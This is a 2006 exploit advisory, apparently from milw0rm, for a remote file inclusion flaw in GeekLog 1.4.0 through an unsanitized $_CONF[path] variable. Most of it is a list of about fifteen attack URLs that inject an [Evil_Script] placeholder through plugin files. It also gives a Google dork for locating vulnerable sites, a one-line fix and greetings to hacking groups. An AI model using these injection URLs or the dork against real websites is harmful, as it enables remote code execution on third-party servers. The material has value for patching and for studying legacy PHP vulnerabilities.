@@ -1,0 +1,75 @@
+--------------------------------------------------------------------------- 
+GeekLog <= 1.4.0 (_CONF[path]) Remote File Include Vulnerabilities
+---------------------------------------------------------------------------
+
+Google d0rk: "powered by geeklog"
+
+
+Discovered By Kw3[R]Ln [ Romanian Security Team ] : hTTp://RoSecurityGroup.net :
+Remote : Yes
+Critical Level : Dangerous
+
+---------------------------------------------------------------------------
+Affected software description :
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : GeekLog  
+version : latest version [ 1.4 ]
+URL : http://www.geeklog.net/
+
+------------------------------------------------------------------
+Exploit:
+~~~~~~~~
+
+Variable $_CONF[path] not sanitized.When register_globals=on an attacker can exploit this vulnerability with a simple php injection script.
+
+were [path] on some cases => www.site.com/[path]/public_html/index.php
+
+# http://www.site.com/[path]/plugins/links/functions.inc?_CONF[path]=[Evil_Script] 
+# http://www.site.com/[path]/plugins/polls/functions.inc?_CONF[path]=[Evil_Script] 
+# http://www.site.com/[path]/plugins/spamx/BlackList.Examine.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/spamx/DeleteComment.Action.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/spamx/EditIPofURL.Admin.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/spamx/MTBlackList.Examine.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/spamx/MassDelete.Admin.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/spamx/MailAdmin.Action.class.php?_CONF[path]=[Evil_Script]
+#http://www.site.com/[path]/plugins/spamx/MassDelTrackback.Admin.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/spamx/EditHeader.Admin.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/spamx/EditIP.Admin.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/spamx/IPofUrl.Examine.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/spamx/Import.Admin.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/spamx/LogView.Admin.class.php?_CONF[path]=[Evil_Script]
+# http://www.site.com/[path]/plugins/staticpages/functions.inc?_CONF[path]=[Evil_Script]
+
+
+
+
+---------------------------------------------------------------------------
+
+Solution :
+~~~~~~~~~~
+
+declare variabel $_CONF[path]
+---------------------------------------------------------------------------
+
+
+Shoutz:
+~~~~~~
+
+# Special greetz to my good friend [Oo]
+# To all members of h4cky0u.org ;) and RST [ hTTp://RoSecurityGroup.net ]
+---------------------------------------------------------------------------
+
+*/
+
+Contact:
+~~~~~~~~
+
+Nick: Kw3rLn
+E-mail: ciriboflacs[at]YaHoo[dot]Com
+Homepage: hTTp://RoSecurityGroup.net
+/*
+
+-------------------------------- [ EOF] ----------------------------------
+
+# milw0rm.com [2006-06-29]
